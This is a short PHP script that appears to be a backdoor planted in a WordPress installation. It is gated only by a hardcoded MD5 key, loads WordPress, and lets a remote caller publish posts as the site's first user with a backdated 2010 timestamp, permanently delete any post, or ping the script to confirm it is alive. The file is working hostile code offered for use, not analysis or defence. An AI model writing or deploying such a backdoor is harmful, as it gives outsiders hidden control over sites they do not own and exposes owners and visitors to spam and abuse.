<?php
if(md5(@$_GET["api_key"]) != 'f2745b0fbeb79404967de8381fefb0a0')
{
    exit();
}
include "wp-load.php";

if(@$_POST["proc"] == "new_post")
{
    $categories = get_categories();
    $category_id = $categories[1]->term_id;
    $postdate = '2010-02-23 18:57:33';
    $my_post = array(
      'post_title'    => wp_strip_all_tags(base64_decode(@$_POST['post_title'])),
      'post_content'  => stripslashes(@$_POST['post_content']),
      'post_status'   => 'publish',
      'post_author'   => 1,
      'post_date'     =>   $postdate,
      'post_category' => array($category_id)
    );
    $post_id = wp_insert_post($my_post);
    if($post_id)
    {
        echo $post_id;
    }
}elseif(@$_POST["proc"] == "delete_post"){
    
    if(wp_delete_post($_POST["post_id"], true))
    {
        echo 'success';
    }
}elseif(@$_POST["proc"] == "check")
{
    echo 'success';
}